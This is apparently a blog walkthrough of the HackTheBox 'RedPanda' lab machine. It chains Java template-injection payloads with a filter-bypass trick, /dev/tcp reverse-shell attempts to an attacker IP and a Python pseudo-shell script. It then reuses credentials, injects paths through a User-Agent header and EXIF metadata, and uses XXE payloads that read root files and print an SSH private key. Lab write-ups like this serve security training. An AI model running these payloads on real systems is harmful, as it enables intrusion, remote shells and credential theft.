---
title: "HTB - RedPanda"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/redpanda/logo.png
favicon: /images/walkthroughs/hackthebox/redpanda/logo.png
description: HTB - RedPanda walkthrough
---

# RedPanda

<p align="center">
  <img src="/images/walkthroughs/hackthebox/redpanda/banner.png" width="90%"/>
</p>


## Summary

RedPanda is an easy and interesting box where we land into a web with an SSTI vulnerability. I could not get a reverse shell there, but we could read files. After a long time of enumeration (using a custom script to simulate a shell), we retrieved some DB credentials from the code that were reused in the SSH.

For privilege escalation we need some code review of an application that it is running as root. After spotting the several injection points and correctly aling the payloads to make some path injections (no sanitization at the server) we are able to craft custom XMLs that are being served, so we need to exploit an XXE vulnerability to retrieve the flag and also the SSH keys for the root user.

Probably, one of the most enjoyable boxes I have solved due to the concatenation of several vulnerabilities. Let's get into it!

## Recon 

- nmap

```bash
nmap -sC -sV -p- 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 24 Aug 2022 15:39:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye'
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 24 Aug 2022 15:39:37 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 24 Aug 2022 15:39:37 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
```

In nmap we can see that the port 8080 is a web server. When we reach it, it displays the following website with a browser:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/1_0_web.png" width="90%"/>
</p>

As seen on the title line, it is powerded by Spring Boot, therefore Java and any of their templating components might be running in the backend. Some basic [SSTI payloads for Java](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java) backends shows us some interesting results, showing that the payload is working:


```java
@(6+5)
// Result in the website: You searched for: @?11

#{3*3}
// Result in the website: You searched for: ??9_en_US??

*{7*7}
// Result in the website: You searched for: 49
```

At the end, we spotted that the optimal expoitation payload is by using the \* before the brackets. Once we have the core exploit, we go for advance payloads, in this test I tried to execute a command, but instead of returning the output, the webserver is printing the object it returned with the process information:


```java
*{T(java.lang.Runtime).getRuntime().exec("cat etc/passwd")}
//You searched for: Process[pid=98196, exitValue="not exited"]
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/2_0_test.png" width="90%"/>
</p>


I give a shot to multiple payloads trying to spawn a reverse shell, but some of the special characters were being filtered/banned as displayed by the website:

```java
*{T(java.lang.Runtime).getRuntime().exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.3/5454;cat <&5 | while read line; do \$line 2>&5 >&5; done")] as String[]).waitFor()}

*{T(java.lang.Runtime).getRuntime().exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.3/5454;cat <&5 | while read line; do \\".concat(T(java.lang.Character).toString(36)).concat("line 2>\\&5 >&5; done")] as String[]).waitFor()}

*{T(java.lang.Runtime).getRuntime().exec(["ls")] as String[]).waitFor()}
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/2_1_banned.png" width="90%"/>
</p>


Finally I end up using the character concatenation to build the payload. Java will concatenate the different characters (provided in decimal to bypass any filter) building up the desired payload. For example, if we want to execute the cat command we will concatenate characters 99, 97 and 116 (ascii values for c, a and t) and so on.

```java
// cat /home/woodenk/user.txt

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}

// Result in the website: You searched for: d063ce1c7aed9b36aa5ffd08d3eb1946
```

To automate the process I got an script from GitHub and enhanced it, resulting the following python script to set a "pseudo-shell" and set all make all the SSTI payload design unoticeable for the user.


```python
#!/usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse
import requests, re
from bs4 import BeautifulSoup

# Example command: python3 script.py -u http://10.10.11.170:8080/search

parser = argparse.ArgumentParser(description="Generate SSTI payloads for Java vulnerable apps")
parser.add_argument("-e","--url-encode", action="store_true", help="URL Encode")
parser.add_argument("-u","--url", type=str, required=True, help="Target URL")

args = parser.parse_args()

url_encode = args.url_encode
url = args.url

print(character)
class Terminal(Cmd):
    prompt='\033[1;33mCommand ==>\033[0m '

    def send_cmd(self, payload):

        # Customize input content
        data = {"name": payload}
        r = requests.post(url, data=data)
        
        # Customize return content
        dom = BeautifulSoup(r.text, 'html.parser')
        try:
            output = dom.find_all('h2')[0].get_text()
            cmd_output = output[25:]
            print(r.text)
            print(cmd_output)
        except Exception:
            print(r.text)


    def decimal_encode(self,args):

        command = args
        decimals = []

        for i in command:
            decimals.append(str(ord(i)))

        payload = '''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
        

        for i in decimals[1:]:
            letter = '.concat(T(java.lang.Character).toString({}))'.format(i)
            payload += letter

        payload += ').getInputStream())}'

        self.send_cmd(payload)

        if url_encode:
            payload_encoded=urllib.parse.quote_plus(payload,safe='')
            return payload_encoded
        else:
            return payload

    def default(self,args):
        self.decimal_encode(args)
        print('-'*15)

try:

    term=Terminal()
    term.cmdloop()

except KeyboardInterrupt:
    quit()
```

Now we can check for any hint within the box. We are lucky, since the same user running the server is the one with the flag, no need to pivot wintin the machine:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/2_2_flag.png" width="90%"/>
</p>

``` 786c397d794c360f464b9b85978b49ab ```

We have the user flag, but we still need to get in. Tried several reverse shell payloads but could not get one to work, so I decided to explore the machine, with my mind fouces on finding any SSH keys (id_rsa) or DB credentials on the code.

```bash
Command ==> pwd
    /tmp/hsperfdata_woodenk 

Command ==> ls
    883

Command ==> ls ../
    hsperfdata_root 
    hsperfdata_woodenk 
    systemd-private-26fc97457295411cbe6e843c00188871-ModemManager.service-coyzBi 
    systemd-private-26fc97457295411cbe6e843c00188871-systemd-logind.service-8FvBaj
    systemd-private-26fc97457295411cbe6e843c00188871-systemd-resolved.service-Ip7b4i
    systemd-private-26fc97457295411cbe6e843c00188871-systemd-timesyncd.service-9YQKSf
    tomcat.8080.17725477970259632754 
    tomcat-docbase.8080.9689730580099091298 
    vmware-root_655-4021587944

Command ==> ls -la /home/woodenk
    total 44
    drwxr-xr-x 6 woodenk woodenk 4096 Aug 24 16:28 .
    drwxr-xr-x 3 root    root    4096 Jun 14 14:35 ..
    lrwxrwxrwx 1 root    root       9 Jun 14 11:38 .bash_history -> /dev/null
    -rw-r--r-- 1 woodenk woodenk  220 Jun 14 11:12 .bash_logout
    -rw-r--r-- 1 woodenk woodenk 3938 Jun 14 12:37 .bashrc
    drwx------ 2 woodenk woodenk 4096 Jun 23 19:04 .cache
    drwx------ 3 woodenk logs    4096 Aug 24 16:39 .gnupg
    -rw------- 1 woodenk logs     399 Aug 24 16:28 key.txt
    drwxrwxr-x 3 woodenk woodenk 4096 Jun 14 14:35 .local
    drwxrwxr-x 4 woodenk woodenk 4096 Jun 14 14:35 .m2
    -rw-r--r-- 1 woodenk woodenk  807 Jun 14 11:12 .profile
    -rw-r----- 1 root    woodenk   33 Aug 24 14:33 user.txt
```

Sadly, I found no SSH keys... Looking for secrets in the code I found under /opt/panda_search:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/2_3_code.png" width="90%"/>
</p>

```bash
Command ==> ls -la /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/
    total 24
    drwxrwxr-x 2 root root 4096 Jun 21 12:24 .
    drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
    -rw-rw-r-- 1 root root 4321 Jun 20 13:02 MainController.java
    -rw-rw-r-- 1 root root  779 Feb 21  2022 PandaSearchApplication.java
    -rw-rw-r-- 1 root root 1800 Jun 14 14:09 RequestInterceptor.java
```

The interesting code was found in the Controller, and at the very botton we can see some hardcoded credentials:

**MainController.java**

```java
import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

Credentials for the DB:

**woodenk:RedPandazRule**

Testing out for an SSH session, we are lucky and the user is reusing the password for the SSH service:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/3_0_in.png" width="90%"/>
</p>


## Privesc

First thing I recalled is the cleanup sh script on the opt folder, executable by all users:

```bash
woodenk@redpanda:/opt$ ls -la
    total 24
    drwxr-xr-x  5 root root 4096 Jun 23 18:12 .
    drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
    -rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh
    drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score
    drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven
    drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search

woodenk@redpanda:/opt$ cat cleanup.sh 
    #!/bin/bash
    /usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
    /usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
    /usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
    /usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
    /usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
    /usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
    /usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
    /usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

Checked the pspy output for any hint about its execution, but what I see is that the script that is running is run_credits.sh, but we cannot read or write it.

```bash
2022/07/21 16:51:33 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/07/21 16:52:01 CMD: UID=0    PID=35317  | /usr/sbin/CRON -f 
2022/07/21 16:52:01 CMD: UID=0    PID=35320  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/07/21 16:52:01 CMD: UID=0    PID=35319  | /bin/sh /root/run_credits.sh 
2022/07/21 16:52:01 CMD: UID=0    PID=35318  | /bin/sh -c /root/run_credits.sh 
2022/07/21 16:52:06 CMD: UID=0    PID=35337  | /usr/sbin/sshd -D -R 
2022/07/21 16:52:06 CMD: UID=0    PID=35338  | /usr/sbin/sshd -D -R 
2022/07/21 16:52:18 CMD: UID=0    PID=35341  | /usr/sbin/sshd -D -R 
2022/07/21 16:52:18 CMD: UID=0    PID=35340  | /usr/sbin/sshd -D -R 
2022/07/21 16:52:18 CMD: UID=0    PID=35343  | /usr/sbin/sshd -D -R 
2022/07/21 16:52:18 CMD: UID=0    PID=35342  | /usr/sbin/sshd -D -R 
```

Checking out previous findings with source code, I decided to recheck the credit-score project within the /opt folder:


```java
// woodenk@redpanda:/opt/credit-score/LogParser/final/src/main/java/com/logparser$ cat App.java 

package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {

            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }

    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

The name run_credits.sh makes me think that is running the credit-score project. So I decided to break apart this App.java apart and check if there is something that we can take advantage of, since it's running periodically as the root user.


- The main function:

```java
//Opens redpanda.log a root file that can be writen by 'logs' group, woodend is not in that group but he can read it (check it out down below)
File log_fd = new File("/opt/panda_search/redpanda.log");
Scanner log_reader = new Scanner(log_fd);

// Goes line by line, this is a line example from the log:
// 200||10.10.14.13||tplmap/0.5||/search
while(log_reader.hasNextLine())
{
    String line = log_reader.nextLine();
    if(!isImage(line))
    {
        continue;
    }
    // Parse log returns a Map, spliting the line with the vertical bars and taking it into the Map 
    // With all this, we can assume what it is being logged:
    // status_code || ip || UA || uri
    Map parsed_data = parseLog(line);
    System.out.println(parsed_data.get("uri"));

    // getArtist retrieves the Artist attribute from the metadata of the file on /opt/panda_search/src/main/resources/static/<uri>
    String artist = getArtist(parsed_data.get("uri").toString());
    System.out.println("Artist: " + artist);
    String xmlPath = "/credits/" + artist + "_creds.xml";
    // Increments views counter for artist and the image
    addViewTo(xmlPath, parsed_data.get("uri").toString());
}
```

- getArtist:

It is using the [metadata-extractor](https://github.com/drewnoakes/metadata-extractor) library. To understand this, refer to the [tag reading functions](https://github.com/drewnoakes/metadata-extractor/wiki/Getting-Started-(Java)#2-query-tags).

```java
// Creates/reads a file for a jpg file
String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
File jpgFile = new File(fullpath);

// Gets the metadata from the jpg
Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
for(Directory dir : metadata.getDirectories())
{
    for(Tag tag : dir.getTags())
    {   // Returns the artist from the metadata (if exists)
        if(tag.getTagName() == "Artist")
        {
            return tag.getDescription();
        }
    }
}
return "N/A";
```

- addViewTo(String path, String uri):

```java
SAXBuilder saxBuilder = new SAXBuilder();
XMLOutputter xmlOutput = new XMLOutputter();
xmlOutput.setFormat(Format.getPrettyFormat());

File fd = new File(path);
// Gets the XML file with the artist name from the metadata
Document doc = saxBuilder.build(fd);

Element rootElement = doc.getRootElement();

for(Element el: rootElement.getChildren())
{
    // Increments the counter of views attribute and the total views for the artist
    if(el.getName() == "image")
    {
        if(el.getChild("uri").getText().equals(uri))
        {
            Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
            System.out.println("Total views:" + Integer.toString(totalviews));
            rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
            Integer views = Integer.parseInt(el.getChild("views").getText());
            el.getChild("views").setText(Integer.toString(views + 1));
        }
    }
}
BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
xmlOutput.output(doc, writer);
```

- The log file:

```bash
cat /opt/panda_search/redpanda.log
    200||10.10.14.13||tplmap/0.5||/search
    200||10.10.14.13||tplmap/0.5||/search
    200||10.10.14.13||tplmap/0.5||/search
    200||10.10.14.13||tplmap/0.5||/search
    200||10.10.14.13||tplmap/0.5||/search
    200||10.10.14.13||tplmap/0.5||/search
    404||10.10.16.26||Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002847)||/_vti_bin/cfgwiz.exe
    404||10.10.16.26||Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002847)||/error
    404||10.10.16.26||Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002848)||/_vti_bin/CGImail.exe
    404||10.10.16.26||Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002848)||/error
```


I review all the injection points that we have at this point to build an attack:

```java
String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
File jpgFile = new File(fullpath);

String xmlPath = "/credits/" + artist + "_creds.xml";
```

- Root is opening and writting an XML file.
- We can inject a path using the artist metadata and change the XML file (_xmlPath_) that the app (with root permissions) reads.
- We can inject a path using the URI (_fullpath_) for the jpg file (and artist metadata) to take whatever artist we want.


So the attack will consist of creating an XML file with [XXE payload](https://github.com/payloadbox/xxe-injection-payload-list) to exfiltrate any file in the system. I'm going to retrieve the flag from the root. The following basic XXE will do the job:


- Build the XML file that the root is going to open:

```bash
nano /tmp/mir_creds.xml
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/root.txt"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

- Create an image with the custom artist. The artist will be injected like depicted bellow:

/credits/ + artist + \_creds.xml

/credits/**../tmp/mir**\_creds.xml

On our machine, we edit the artist metadata and then upload it to the tmp folder:

```bash
exiftool -artist=../tmp/mir masterpiece.jpg
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/6_0_masterpiece.png" width="70%"/>
</p>


- Create a request to get logged in the file with a malicious URI:

The JPG path will be retrieved from the URI on the request logs and placed here:

/opt/panda_search/src/main/resources/static + uri

Then, the following string will go to the photo we will upload at tmp/masterpiece.png

```bash
curl http://10.10.11.170:8080/../../../../../../tmp/masterpiece.jpg
```

As we can see in the logs, the server is taking out the '../' from the request path:

```
woodenk@redpanda:/tmp$ cat /opt/panda_search/redpanda.log
200||10.10.14.137||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/search
200||10.10.14.137||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/search
404||10.10.14.59||curl/7.81.0||/tmp/masterpiece.png
404||10.10.14.59||curl/7.81.0||/error
```

To solve this, we can do the trick in the parsing method. Let's set a user agent with "\|\|" followed by our URI payload, so we add an extra position (5 in total) and now we have control of the position 3 (the URI) with no server interaction, therefore, dots will remain in place:


```java
// Recalling the parsing function
String[] strings = line.split("\\|\\|");
map.put("status_code", Integer.parseInt(strings[0]));
map.put("ip", strings[1]);
map.put("user_agent", strings[2]);
map.put("uri", strings[3]);
```


status_code     ip           user_agent                 uri                            real_uri
404         ||10.10.14.59||**curl/7.81.0||/../../../../../../tmp/masterpiece.jpg**||/copycat


```bash
curl -H "User-Agent: curl/7.81.0||/../../../../../../tmp/masterpiece.jpg" http://10.10.11.170:8080/copycat
```

- Wait for the run_credits.sh to run

And after sometime waiting for the run_credits to run, we get the root.txt

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/7_0_root.png" width="90%"/>
</p>


```bash
woodenk@redpanda:/tmp$ cat mir_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<userInfo>
  <firstName>John</firstName>
  <lastName>e0136ab5bdf0c600a4f56791d108e1b7</lastName>
</userInfo>
```

``` e0136ab5bdf0c600a4f56791d108e1b7 ```

Now that I have the flag, I tried to get a shell exfiltrating the id_rsa file in the root directory. I don't know if there is such file, but I let the attack running just in case. Modify the XML to target the id_rsa file:

```bash
nano /tmp/mir_creds.xml
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

I sent the curl request again to make sure that it gets registered in the logs, and after waiting (so long that I thought that no id_rsa was in the root directory), we get the key:

```xml
woodenk@redpanda:/tmp$ cat mir_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<userInfo>
  <firstName>John</firstName>
  <lastName>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</lastName>
</userInfo>
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/redpanda/7_1_root_in.png" width="90%"/>
</p>

